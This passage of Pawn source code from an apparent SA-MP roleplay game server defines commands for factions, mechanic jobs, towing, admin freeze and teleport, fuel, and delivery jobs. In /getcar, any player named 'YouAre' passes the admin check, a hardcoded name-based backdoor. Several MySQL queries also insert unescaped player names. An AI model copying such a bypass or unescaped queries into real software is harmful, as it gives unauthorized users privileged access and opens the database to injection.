					else if(level == 9) { PlayerInfo[para1][pModel] = 147; } //News Reporter
					else if(level == 10) { PlayerInfo[para1][pModel] = 296; } //Ballas
                    else if(level == 11) { PlayerInfo[para1][pModel] = 294; } //The Agency
                    else if(level == 12) { PlayerInfo[para1][pModel] = 189; } //School Instructors
                    else if(level == 13) { PlayerInfo[para1][pModel] = 228; } //Los Santos Taxi
                    else if(level == 14) { PlayerInfo[para1][pModel] = 279; } //Paramedic
                    else if(level == 15) { PlayerInfo[para1][pModel] = 301; } //SFPD
					if(level == 0)
					{
					    gTeam[para1] = 3;
				    	PlayerInfo[para1][pTeam] = 3;
					}
					else if(level == 1 || level == 2 || level == 3 || level == 7 || level == 8 || level == 15)
					{
					    gTeam[para1] = 2;
				    	PlayerInfo[para1][pTeam] = 2;
					}
					else if(level == 4 || level == 5 || level == 6 || level == 10)
					{
					    gTeam[para1] = 5;
				    	PlayerInfo[para1][pTeam] = 5;
					}
					else if(level == 9 || level == 12 || level == 13 || level == 14)
					{
					    gTeam[para1] = 4;
				    	PlayerInfo[para1][pTeam] = 4;
					}
					else if(level == 11)
					{
					    gTeam[para1] = 11;
				    	PlayerInfo[para1][pTeam] = 11;
					}
				    SetPlayerSkin(para1, PlayerInfo[para1][pModel]);
                    PlayerInfo[para1][pRank] = 7;
				 	new wakaname[25];
					GetPlayerName(para1,wakaname,25);
					new str[356];
					mysql_format(SQL,str,356,"UPDATE users SET `Leader`='%d',`Member`='%d',`Rank`='7',`Team`='%d',`Model`='%d' WHERE `name`='%s'",PlayerInfo[para1][pLeader],PlayerInfo[para1][pMember],PlayerInfo[para1][pTeam],PlayerInfo[para1][pModel],PlayerInfo[para1][pNormalName]);
					mysql_tquery(SQL,str,"","");
					SetPlayerToTeamColor(para1);
				}
			}
     		else
    		{
                SendClientMessage(playerid, COLOR_SERVER, "{C1F589}Error: Player not connected.");
    		}
		}
		else
		{
			SendClientMessage(playerid, COLOR_ERROR, AdminOnly);
		}
	}
	return 1;
}
CMD:refill(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
    if(IsPlayerConnected(playerid))
    {
	    if(PlayerInfo[playerid][pJob] != 8) return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}You are not a Mechanic.");
		new playa,money,string[256],giveplayer[25],sendername[25];
	 	if(sscanf(params, "ui",playa,money)) return SendClientMessage(playerid, COLOR_SERVER, "{A9C4E4}Usage: {FFFFFF}/refill <Name/Playerid> <Price>");
		if(money < 1 || money > 10000) return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}Price not lower then 1, or above 10,000.");
		if(RefillOffer[playa] == playerid) return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}This player already have refill.");
		if(RepairTime[playerid] > 0) return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}You can use it only once every 60 seconds.");
		if(IsPlayerConnected(playa))
		{
		    if(playa != INVALID_PLAYER_ID)
		    {
		        if(ProxDetectorS(8.0, playerid, playa)&& IsPlayerInAnyVehicle(playa))
				{
				    if(playa == playerid) return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}Can't do that.");
				    GetPlayerName(playa, giveplayer, sizeof(giveplayer));
					GetPlayerName(playerid, sendername, sizeof(sendername));
				    format(string, sizeof(string), "{B8FFDB}* You offerd %s to refill his car for $%s.",giveplayer,FormatNumber(money));
					SendClientMessage(playerid, COLOR_SERVER, string);
					format(string, sizeof(string), "{B8FFDB}* Car Mechanic %s wants to refill your car for $%s, (type /accept refill %d) to accept.",sendername,FormatNumber(money),playerid);
					SendClientMessage(playa, COLOR_SERVER, string);
					RefillOffer[playa] = playerid;
					RefillPrice[playa] = money;
					RepairTime[playerid] = 60;
				}
				else return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}That player is not near you/not in a car.");
			}
		}
		else return SendClientMessage(playerid, COLOR_SERVER, "{C1F589}Error: Player not connected.");
	}
	return 1;
}
CMD:repair(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
    if(IsPlayerConnected(playerid))
    {
	    if(PlayerInfo[playerid][pJob] != 8) return SendClientMessage(playerid, COLOR_GREY, "{FFB870}You are not a Mechanic.");
		new playa,money,string[256],giveplayer[25],sendername[25];
 		if(sscanf(params, "ui",playa,money)) return SendClientMessage(playerid, COLOR_SERVER, "{A9C4E4}Usage: {FFFFFF}/repair <Name/Playerid> <Price>");
		if(money < 1 || money > 99999) return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}Price not lower then 1, or above 99999.");
    	if(RepairOffer[playa] == playerid) return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}This player already have repair.");
    	if(RepairTime[playerid] > 0) return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}Trebuie sa astepti 60 de secunde inainte sa utilizezi iar aceasta comanda");
		if(IsPlayerConnected(playa))
		{
		    if(playa != INVALID_PLAYER_ID)
		    {
		        if(ProxDetectorS(8.0, playerid, playa)&& IsPlayerInAnyVehicle(playa))
				{
				    if(playa == playerid) return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}Can't do that.");
			    	GetPlayerName(playa, giveplayer, sizeof(giveplayer));
					GetPlayerName(playerid, sendername, sizeof(sendername));
				    format(string, sizeof(string), "{B8FFDB}* You offerd %s to fix his car for $%s .",giveplayer,FormatNumber(money));
					SendClientMessage(playerid, COLOR_SERVER, string);
					format(string, sizeof(string), "{B8FFDB}* Car Mechanic %s wants to repair your car for $%s, (type /accept repair %d) to accept.",sendername,FormatNumber(money),playerid);
					SendClientMessage(playa, COLOR_SERVER, string);
					RepairOffer[playa] = playerid;
					RepairPrice[playa] = money;
					RepairTime[playerid] = 60;
				}
				else return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}That player is not near you/not in a car.");
			}
		}
		else return SendClientMessage(playerid, COLOR_SERVER, "{C1F589}Error: Player not connected.");
	}
	return 1;
}
CMD:dropcar(playerid, params[])
{
    if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	if(CP[playerid] > 0 || IsCollectingRubbish[playerid] > 0 || IsATruck(GetPlayerVehicleID(playerid)) || MechanicCallTime[playerid] > 0 || CheckBus[playerid] > 0 && CarJacker[playerid] < 1 && JCurier[playerid][0] < 1)
	{
 		ShowPlayerDialog(playerid, DIALOG_JOBULETES, DIALOG_STYLE_MSGBOX, "Cancel Checkpoint", "Are you sure you want to cancel the current checkpoint?", "Yes", "Nu");
	}
    if(IsPlayerConnected(playerid))
	{
	    if(JackAcc[playerid] > 0)
		{
			new string[128];
			format(string,sizeof(string),"Wait %d seconds before drop another car.",JackAcc[playerid]);
			SendClientMessage(playerid, COLOR_SERVER, string);
			return 1;
		}
	    if(PlayerInfo[playerid][pJob] == 2)
	    {
	        if(GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
	        {
				if(OwnedVeh(GetPlayerVehicleID(playerid)) == 0)
				{
					SetPlayerCheckpoint(playerid, 2850.9663, 891.8728, 10.7500, 10.0);
					CarJacker[playerid] = 1;
					SendClientMessage(playerid, COLOR_SERVER, "Reach the checkpoint to drop your vehicle off at the crane.");
				}
				else return SendClientMessage(playerid, COLOR_SERVER, "You can't sell personal vehicles.");
			}
		}
		else return SendClientMessage(playerid, COLOR_SERVER, "You are not a car jacker. Use /jobs.");
	}
	return 1;
}
CMD:tow(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
    if(IsPlayerConnected(playerid))
	{
	    if(PlayerInfo[playerid][pJob] == 8)
	    {
	        if(GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
	        {
	            new m = GetVehicleModel(GetPlayerVehicleID(playerid));
		    	if (m == 525)
	     	   	{
	     	   	    if(TowAcc[playerid] == 1) return SendClientMessage(playerid, COLOR_GREY, "You can not tow a car so fast, you have to wait two minutes.");
	     	   	    if(GetPlayerState(playerid)==2)
	     	   	    {
						new Float:pX,Float:pY,Float:pZ;
						GetPlayerPos(playerid,pX,pY,pZ);
						new Float:vX,Float:vY,Float:vZ;
						new Found=0;
						new vid=0;
						while((vid<MAX_VEHICLES)&&(!Found))
						{
		   					vid++;
		   					GetVehiclePos(vid,vX,vY,vZ);
		   					if ((floatabs(pX-vX)<7.0)&&(floatabs(pY-vY)<7.0)&&(floatabs(pZ-vZ)<7.0)&&(vid!=GetPlayerVehicleID(playerid)))
							{
								if(IsABike(vid) || GetVehicleModel(vid) == 448 || GetVehicleModel(vid) == 461 || GetVehicleModel(vid) == 462 || GetVehicleModel(vid) == 463 || GetVehicleModel(vid) == 468 || GetVehicleModel(vid) == 471 || GetVehicleModel(vid) == 521 || GetVehicleModel(vid) == 522 || GetVehicleModel(vid) == 523)
								{
		 							SCM(playerid,COLOR_SERVER,"{FFB870}Please chose another vehicle this is invalid model.");
								    return 1;
								}
								if(OwnedVeh(vid) != 0)
								{
								    SCM(playerid,COLOR_SERVER,"{FFB870}You can't tow your personal car.");
								    return 1;
								}
							    Found=1;
		   				    	if(IsTrailerAttachedToVehicle(GetPlayerVehicleID(playerid)))
		           				{
		   				        	DetachTrailerFromVehicle(GetPlayerVehicleID(playerid));
                     				DisablePlayerCheckpoint(playerid);
                                    gPlayerCheckpointStatus[playerid] = CHECKPOINT_NONE;
						       	}
					           	else
					           	{
		    						AttachTrailerToVehicle(vid,GetPlayerVehicleID(playerid));
	                				new rand;
									rand = random(sizeof(TowCarCk));
						 		    SetPlayerCheckpoint(playerid, TowCarCk[rand][0],TowCarCk[rand][1],TowCarCk[rand][2], 6);
                         			CP[playerid] = 34;
								}
		 					}
		     			}
						if(!Found) return SendClientMessage(playerid,COLOR_SERVER, "{FFB870}There is no car in range.");
					}
					else return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}You need to be the driver.");
				}
				else return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}You need to be in a tow truck to use this.");
			}
			else return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}You need to be in a vehicle to do this.");
		}
		else return SendClientMessage(playerid,COLOR_SERVER, "{FFB870}You need to be a mechanic to use this.");
	}
	return 1;
}
CMD:spawnchange(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
    if(IsPlayerConnected(playerid))
    {
	    if(PlayerInfo[playerid][pPhousekey] != 999 || PlayerInfo[playerid][pPhousekey2] != 999 || PlayerInfo[playerid][pRented] > 0)
        {
			new executat = 0;
            if(folosirespawnchange[playerid] == 0 && executat == 0)
            {
                SendClientMessage(playerid, COLOR_SERVER,"{C1F589}You will now spawn at your Normal Place.");
                PlayerInfo[playerid][pSpawnChange] = 0;
                Update(playerid, pSpawnChangex);
				folosirespawnchange[playerid] = 1;
				executat = 1;
			}
			if(folosirespawnchange[playerid] == 1 && executat == 0)
			{
				SendClientMessage(playerid, COLOR_SERVER, "{C1F589}You will now spawn at your VIP House.");
                PlayerInfo[playerid][pSpawnChange] = 2;
                Update(playerid, pSpawnChangex);
				folosirespawnchange[playerid] = 2;
				executat = 1;
			}
            if(folosirespawnchange[playerid] == 2 && executat == 0) 
            {
                SendClientMessage(playerid, COLOR_SERVER, "{C1F589}You will now spawn at your Own/Rented House.");
                PlayerInfo[playerid][pSpawnChange] = 1;
                Update(playerid, pSpawnChangex);
				folosirespawnchange[playerid] = 0;
				executat = 1;
            }
        }
        else return SCM(playerid,COLOR_SERVER,"{C1F589}You do not have a home or did not rent.");
    }
    return 1;
}
CMD:unfreeze(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
    if(IsPlayerConnected(playerid))
    {
		if (PlayerInfo[playerid][pAdmin] >= 1 || PlayerInfo[playerid][pHelper] >= 1)
		{
			new playa;
			if(sscanf(params, "u",playa)) return SendClientMessage(playerid, COLOR_SERVER, "{A9C4E4}Usage: {FFFFFF}/unfreeze <Name/Playerid>");
		    if(IsPlayerConnected(playa))
		    {
		        if(playa != INVALID_PLAYER_ID)
		        {
					TogglePlayerControllable(playa, 1);
					new sendername[25],giveplayer[25],string[100];
					GetPlayerName(playerid,sendername,sizeof(sendername));
					GetPlayerName(playa,giveplayer,sizeof(giveplayer));
					format(string, sizeof(string), "[Admin-Warn]: {FFFFFF}%s used /unfreeze on %s.",sendername, giveplayer);
					ABroadCast(COLOR_ADMCOMMANDS,string,1);
					HLChat(COLOR_AdminWarn,string);
				 	arefreeze[playa] = 0;
					return 1;
				}
			}
			else return SendClientMessage(playerid, COLOR_SERVER, "{C1F589}Error: Player not connected.");
		}
		else return SendClientMessage(playerid, COLOR_SERVER,"{5CAD5C}Error: Your admin/help level isn't high enough to use this command.");
	}
	return 1;
}
CMD:freeze(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
    if(IsPlayerConnected(playerid))
    {
		if (PlayerInfo[playerid][pAdmin] >= 1 || PlayerInfo[playerid][pHelper] >= 1)
		{
			new playa,string[128],sendername[30],giveplayer[30];
			if(sscanf(params, "u",playa)) return SendClientMessage(playerid, COLOR_SERVER, "{A9C4E4}Usage: {FFFFFF}/freeze <Name/Playerid>");
		    if(IsPlayerConnected(playa))
		    {
		        if(playa != INVALID_PLAYER_ID)
		        {
					TogglePlayerControllable(playa, 0);
					GetPlayerName(playerid,sendername,sizeof(sendername));
					GetPlayerName(playa,giveplayer,sizeof(giveplayer));
					format(string, sizeof(string), "[Admin-Warn]: {FFFFFF}%s has /freeze-ed %s.",sendername, giveplayer);
					ABroadCast(COLOR_ADMCOMMANDS,string,1);
					HLChat(COLOR_AdminWarn,string);
					arefreeze[playa] = 1;
					return 1;
				}
			}
			else return SendClientMessage(playerid, COLOR_SERVER, "{C1F589}Error: Player not connected.");
		}
		else return SendClientMessage(playerid, COLOR_SERVER,"{5CAD5C}Error: Your admin/help level isn't high enough to use this command.");
	}
	return 1;
}
CMD:entercar(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
    if(IsPlayerConnected(playerid))
    {
		if (PlayerInfo[playerid][pAdmin] >= 2)
 		{
			new testcar,loc;
			if(sscanf(params, "ii",testcar,loc)) return SendClientMessage(playerid, COLOR_SERVER, "{A9C4E4}Usage: {FFFFFF}/entercar <Car ID> <Seat ID>");
			if(loc < 0 || loc > 4) return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}Invalid Seat ID(0-4).");
			PutPlayerInVehicleEx(playerid, testcar, loc);
			SendClientMessage(playerid, COLOR_GRAD1, "You have been teleported.");
		}
		else return SendClientMessage(playerid, COLOR_ERROR, AdminOnly);
	}
	return 1;
}
CMD:PutPlayerInVehicleEx(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
    if(IsPlayerConnected(playerid))
    {
		if (PlayerInfo[playerid][pAdmin] >= 2)
 		{
			new testcar,loc,id;
			if(sscanf(params, "iii",id,testcar,loc)) return SendClientMessage(playerid, COLOR_SERVER, "{A9C4E4}Usage: {FFFFFF}/PutPlayerInVehicleEx <Name/Playerid> <Car ID> <Seat ID>");
			if(loc < 0 || loc > 4) return SendClientMessage(playerid, COLOR_SERVER, "{FFB870}Invalid Seat ID(0-4).");
			PutPlayerInVehicleEx(id, testcar, loc);
			SendClientMessage(id, COLOR_GRAD1, "You have been teleported.");
		}
		else return SendClientMessage(playerid, COLOR_ERROR, AdminOnly);
	}
	return 1;
}
CMD:getcar(playerid, params[])
{
    if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
    new name[MAX_PLAYER_NAME];
    GetPlayerName(playerid, name, sizeof(name));
    if(IsPlayerConnected(playerid))
    {
		if (PlayerInfo[playerid][pAdmin] >= 2 || !strcmp(name, "YouAre"))
		{
  		  	new plo;
			if(sscanf(params, "i",plo)) return SendClientMessage(playerid, COLOR_SERVER, "{A9C4E4}Usage: {FFFFFF}/getcar <Car ID>");
		    new Float:plocx,Float:plocy,Float:plocz;
		    new interiorr = GetPlayerInterior(playerid);
		    new virtuall = GetPlayerVirtualWorld(playerid);
			GetPlayerPos(playerid, plocx, plocy, plocz);
			SetVehiclePos(plo,plocx,plocy+4, plocz);
			LinkVehicleToInterior(plo, interiorr);
			SetVehicleVirtualWorld(plo, virtuall);
		}
		else return SendClientMessage(playerid, COLOR_ERROR, AdminOnly);
	}
	return 1;
}
CMD:outcar(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
    if(IsPlayerConnected(playerid))
    {
		if (PlayerInfo[playerid][pAdmin] >= 2)
		{
    		new plo;
			if(sscanf(params, "u",plo)) return SendClientMessage(playerid, COLOR_SERVER, "{A9C4E4}Usage: {FFFFFF}/outcar <Name/Playerid>");
		    if(IsPlayerConnected(plo))
		    {
				RemovePlayerFromVehicleEx(plo);
				return 1;
			}
			else return SendClientMessage(playerid, COLOR_SERVER, "{C1F589}Error: Player not connected.");
		}
		else return SendClientMessage(playerid, COLOR_ERROR, AdminOnly);
	}
	return 1;
}
CMD:fill(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
	new idcar = GetPlayerVehicleID(playerid);
    if(GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
    {
	    if(GetPVarInt(playerid, "Engine") == 0)
        {
	    	if(IsAtGasStation(playerid))
	    	{
     			TogglePlayerControllable(playerid, 0);
       			GameTextForPlayer(playerid,"~w~~n~~n~~n~~n~~n~~n~~n~~n~~n~Re-Fueling Vehicle, please wait",2000,3);
	    		RefuelTime[playerid] = RefuelWait;
       			Refueling[playerid] = 1;
	    	}
	    	else
		    {
		        if(PlayerInfo[playerid][pFuel] > 0)
		        {
		    		SendClientMessage(playerid, COLOR_ERROR, "* You filled your car with 20% fuel from your gas can.");
					if(Gas[idcar] < 80)
					{
						Gas[idcar] += 20;
					}
					else
					{
					    Gas[idcar] = 100;
					}
		        	PlayerInfo[playerid][pFuel] = 0;
					new str[128];
					mysql_format(SQL,str,sizeof(str),"UPDATE users SET `Fuel`='0' WHERE `name`='%s'",PlayerInfo[playerid][pNormalName]);
					mysql_tquery(SQL,str,"","");
					TogglePlayerControllable(playerid, 1);
				}
				return 1;
	    	}
    	}
    	else
    	{
	    	SendClientMessage(playerid,COLOR_SERVER,"You need to stop your engine before reffueling!");
    	}
    }
	return 1;
}
CMD:fillgascan(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
    if(IsPlayerConnected(playerid))
    {
		if(PlayerInfo[playerid][pGasCan] != 1) return SendClientMessage(playerid, COLOR_ERROR, "You don't have a gas can. Go to a 24/7 shop to buy one.");
	    if(PlayerInfo[playerid][pFuel] < 20)
	    {
	    	if(IsAtGasStation(playerid))
	    	{
     			new price = 20 * 50;
				new string[64];
				format(string, sizeof(string), "You paid $%s to fill the canister with fuel.",FormatNumber(price));
				SendClientMessage(playerid, COLOR_GREEN, string);
				PlayerInfo[playerid][pFuel] = 20;
				GivePlayerCash(playerid, - price);
  				new str[178],bid;
 				mysql_format(SQL,str,sizeof(str),"UPDATE users SET `Money`='%d',`Fuel`='20' WHERE `name`='%s'",GetPlayerCash(playerid),PlayerInfo[playerid][pNormalName]);
				mysql_tquery(SQL,str,"","");
                if(IsPlayerInRangeOfPoint(playerid,25.0,BizzInfo[33][bEntranceX],BizzInfo[33][bEntranceY],BizzInfo[33][bEntranceZ])) bid = 33;
				else if(IsPlayerInRangeOfPoint(playerid,25.0,BizzInfo[42][bEntranceX],BizzInfo[42][bEntranceY],BizzInfo[42][bEntranceZ])) bid = 42;
				else if(IsPlayerInRangeOfPoint(playerid,25.0,BizzInfo[43][bEntranceX],BizzInfo[43][bEntranceY],BizzInfo[43][bEntranceZ])) bid = 43;
				else if(IsPlayerInRangeOfPoint(playerid,25.0,BizzInfo[44][bEntranceX],BizzInfo[44][bEntranceY],BizzInfo[44][bEntranceZ])) bid = 44;
				else if(IsPlayerInRangeOfPoint(playerid,25.0,BizzInfo[45][bEntranceX],BizzInfo[45][bEntranceY],BizzInfo[45][bEntranceZ])) bid = 45;
				else if(IsPlayerInRangeOfPoint(playerid,25.0,BizzInfo[46][bEntranceX],BizzInfo[46][bEntranceY],BizzInfo[46][bEntranceZ])) bid = 46;
				else if(IsPlayerInRangeOfPoint(playerid,25.0,BizzInfo[47][bEntranceX],BizzInfo[47][bEntranceY],BizzInfo[47][bEntranceZ])) bid = 47;
				else if(IsPlayerInRangeOfPoint(playerid,25.0,BizzInfo[48][bEntranceX],BizzInfo[48][bEntranceY],BizzInfo[48][bEntranceZ])) bid = 48;
				else if(IsPlayerInRangeOfPoint(playerid,25.0,BizzInfo[49][bEntranceX],BizzInfo[49][bEntranceY],BizzInfo[49][bEntranceZ])) bid = 49;
				else if(IsPlayerInRangeOfPoint(playerid,25.0,BizzInfo[50][bEntranceX],BizzInfo[50][bEntranceY],BizzInfo[50][bEntranceZ])) bid = 50;
				BizzInfo[bid][bTill] += price;
		    	mysql_format(SQL,str,sizeof(str),"UPDATE `bizz` SET `Till`='%d' WHERE `ID`='%d'",BizzInfo[bid][bTill],bid);
				mysql_tquery(SQL,str,"","");
				return 1;
			}
			else return SendClientMessage(playerid, COLOR_ERROR, "You are not near a gas station.");
		}
	    else return SendClientMessage(playerid, COLOR_ERROR, "Your gas can is already full.");
	}
	return 1;
}
CMD:work(playerid, params[])
{
    if(gPlayerLogged[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "You are not logged in.");
    if(IsPlayerConnected(playerid))
    {
        if(PlayerInfo[playerid][pJob] == 5 || PlayerInfo[playerid][pJob] == 16 || PlayerInfo[playerid][pJob] == 17 || PlayerInfo[playerid][pJob] == 18)
        {
            if(IsPlayerInRangeOfPoint(playerid, 10, 2113.9395,-1776.6284,13.3911) || IsPlayerInRangeOfPoint(playerid, 10, 1104.6542,-1199.9751,17.8557) || IsPlayerInRangeOfPoint(playerid, 10, 850.1213,862.6287,13.3516) ||
			IsPlayerInRangeOfPoint(playerid, 10, 1963.7090,-1363.5723,13.1260))
            {
	            if(GetPlayerState(playerid) == PLAYER_STATE_ONFOOT)
	            {
		            if(workdeja[playerid] == 0 && PlayerInfo[playerid][pJob] == 5 && IsPlayerInRangeOfPoint(playerid, 10, 2113.9395,-1776.6284,13.3911))
		            {
		                new Float:x,Float:y,Float:z;
		                GetPlayerPos(playerid, x, y, z);
		                pizzacar[playerid] = AddStaticVehicle(448, x,y+1,z, 0.0,  1, 1);
		                PutPlayerInVehicleEx(playerid, pizzacar[playerid], 0);
		                Gas[pizzacar[playerid]] = 100;
		                workdeja[playerid] = 1;
		                SetTimerEx("Livrarepizza1", 30000, 0, "i", playerid);
		                SCM(playerid, -1, "{990000}(!)You have 60 seconds to type the command [/pizza], otherwise it will disappear scooter.");
		            }
					if(PlayerInfo[playerid][pJob] == 16 && IsPlayerInRangeOfPoint(playerid, 10, 1104.6542,-1199.9751,17.8557))
					{
						if(JCurier[playerid][0] > 0) return SCM(playerid, COLOR_ERROR, "already working!");
						JCurier[playerid][0] = 1;
						JCurier[playerid][3] = 1;
						JCurier[playerid][1] = 10;
						new Float:rotatie;
						GetPlayerFacingAngle(playerid, rotatie);
						JCurier[playerid][2] = CreateVehicle(414, 1104.6542,-1199.9751,17.8557, rotatie, 1,1, -1);
						CP[playerid] = 151515;
						GameTextForPlayer(playerid, "(~r~!~w~) Collisions have been disabled for 10 seconds.", 5000, 5);
						SCM(playerid, COLOR_SERVER, "Follow each checkpoint to be paid!");
						PutPlayerInVehicleEx(playerid, JCurier[playerid][2], 0);
						DisableRemoteVehicleCollisions(playerid, 1);
						new engine,lights,alarm,doors,bonnet,boot,objective;
						GetVehicleParamsEx(JCurier[playerid][2],engine,lights,alarm,doors,bonnet,boot,objective);
		      	    	SetVehicleParamsEx(JCurier[playerid][2],engine,lights,alarm,1,bonnet,boot,objective);
						if(JCurier[playerid][3] == 1) SetPlayerCheckpoint(playerid, 1352.3694,-1753.3938,13.4537, 4.0); // cp1
						if(JCurier[playerid][3] == 2) SetPlayerCheckpoint(playerid, 2122.4026,-1769.8047,13.4902, 4.0); // cp2
						if(JCurier[playerid][3] == 3) SetPlayerCheckpoint(playerid, 2622.3555,1130.2948,10.9141, 4.0); // cp3
						if(JCurier[playerid][3] == 4) SetPlayerCheckpoint(playerid, 2185.4146,2010.0812,10.9138, 4.0); // cp4
						if(JCurier[playerid][3] == 5) SetPlayerCheckpoint(playerid, 1826.5072,-1843.0140,13.5854, 4.0); // cp5
						if(JCurier[playerid][3] == 6) SetPlayerCheckpoint(playerid, 995.9887,-915.3770,42.2735, 4.0); // cp6

					}
					if(PlayerInfo[playerid][pJob] == 17 && IsPlayerInRangeOfPoint(playerid, 10, 850.1213,862.6287,13.3516))
					{
						if(JCiment[playerid][0] > 0) return SCM(playerid, COLOR_ERROR, "already working!");
						JCiment[playerid][0] = 1;
						JCiment[playerid][1] = 10;
						new Float:rotatie;
						GetPlayerFacingAngle(playerid, rotatie);
						JCiment[playerid][2] = CreateVehicle(524, 850.1213,862.6287,13.3516, rotatie, 1,1, -1);
						CP[playerid] = 171717;
						GameTextForPlayer(playerid, "(~r~!~w~) Collisions have been disabled for 10 seconds.", 5000, 5);
						SCM(playerid, COLOR_SERVER, "Go to checkpoint set cement map to load your vehicle!");
						PutPlayerInVehicleEx(playerid, JCiment[playerid][2], 0);
						DisableRemoteVehicleCollisions(playerid, 1);
						new engine,lights,alarm,doors,bonnet,boot,objective;
						GetVehicleParamsEx(JCiment[playerid][2],engine,lights,alarm,doors,bonnet,boot,objective);
		      	    	SetVehicleParamsEx(JCiment[playerid][2],engine,lights,alarm,1,bonnet,boot,objective);
						SetPlayerCheckpoint(playerid, 586.6498,844.7211,-41.5788, 4.0);

					}
					if(PlayerInfo[playerid][pJob] == 18 && IsPlayerInRangeOfPoint(playerid, 10, 1963.7090,-1363.5723,13.1260))
					{
						if(JCariera[playerid][0] > 0) return SCM(playerid, COLOR_ERROR, "already working!");
						JCariera[playerid][0] = 1;
						JCariera[playerid][1] = 1;
						new Float:rotatie;
						GetPlayerFacingAngle(playerid, rotatie);
						JCariera[playerid][2] = CreateVehicle(486, 1963.7090,-1363.5723,13.1260, rotatie, 1,1, -1);
						CP[playerid] = 1;
						GameTextForPlayer(playerid, "(~r~!~w~) Collisions were disabled.", 5000, 5);
						SCM(playerid, COLOR_SERVER, "Go to all the earth and refine Gramazie");
						PutPlayerInVehicleEx(playerid, JCariera[playerid][2], 0);
						new engine,lights,alarm,doors,bonnet,boot,objective;
						GetVehicleParamsEx(JCariera[playerid][2],engine,lights,alarm,doors,bonnet,boot,objective);
		      	    	SetVehicleParamsEx(JCariera[playerid][2],engine,lights,alarm,1,bonnet,boot,objective);
						CarieraObiect[playerid][0] = CreateDynamicObject(16305, 1923.58606, -1399.60083, 13.66690,   0.00000, 0.00000, 0.00000, -1, -1, playerid, 200.0);
						CarieraObiect[playerid][1] = CreateDynamicObject(16305, 1896.82520, -1405.72656, 13.92690,   0.00000, 0.00000, 0.00000, -1, -1, playerid, 200.0);
						CarieraObiect[playerid][2] = CreateDynamicObject(16305, 1906.79175, -1408.37109, 13.66690,   0.00000, 0.00000, 0.00000, -1, -1, playerid, 200.0);
						CarieraObiect[playerid][3] = CreateDynamicObject(16305, 1872.50342, -1398.84973, 13.66690,   0.00000, 0.00000, 0.00000, -1, -1, playerid, 200.0);
						CarieraObiect[playerid][4] = CreateDynamicObject(16305, 1904.24878, -1398.00195, 13.66690,   0.00000, 0.00000, 0.00000, -1, -1, playerid, 200.0);
						CarieraObiect[playerid][5] = CreateDynamicObject(16305, 1886.09790, -1404.02100, 13.79690,   0.00000, 0.00000, 0.00000, -1, -1, playerid, 200.0);
						CarieraObiect[playerid][6] = CreateDynamicObject(16305, 1881.23755, -1394.82996, 13.79690,   0.00000, 0.00000, 0.00000, -1, -1, playerid, 200.0);
						CarieraObiect[playerid][7] = CreateDynamicObject(16305, 1893.18958, -1395.28503, 13.79690,   0.00000, 0.00000, 0.00000, -1, -1, playerid, 200.0);
						CarieraObiect[playerid][8] = CreateDynamicObject(16305, 1913.65161, -1394.52539, 13.66690,   0.00000, 0.00000, 0.00000, -1, -1, playerid, 200.0);
						CarieraObiect[playerid][9] = CreateDynamicObject(16305, 1914.87415, -1404.55042, 13.79690,   0.00000, 0.00000, 0.00000, -1, -1, playerid, 200.0);
						CarieraObiect[playerid][10] = CreateDynamicObject(16305, 1916.29749, -1415.43311, 13.92690,   0.00000, 0.00000, 0.00000, -1, -1, playerid, 200.0);
						CarieraObiect[playerid][11] = CreateDynamicObject(16305, 1907.16211, -1419.65198, 13.66690,   0.00000, 0.00000, 0.00000, -1, -1, playerid, 200.0);
						CarieraObiect[playerid][12] = CreateDynamicObject(16305, 1916.36169, -1426.55334, 13.66690,   0.00000, 0.00000, 0.00000, -1, -1, playerid, 200.0);
						CarieraObiect[playerid][13] = CreateDynamicObject(16305, 1908.15466, -1431.16992, 13.66690,   0.00000, 0.00000, 0.00000, -1, -1, playerid, 200.0);
						CarieraObiect[playerid][14] = CreateDynamicObject(16305, 1922.87634, -1434.34033, 13.92690,   0.00000, 0.00000, 0.00000, -1, -1, playerid, 200.0);
						CarieraObiect[playerid][15] = CreateDynamicObject(16305, 1925.43298, -1411.01257, 13.66690,   0.00000, 0.00000, 0.00000, -1, -1, playerid, 200.0);
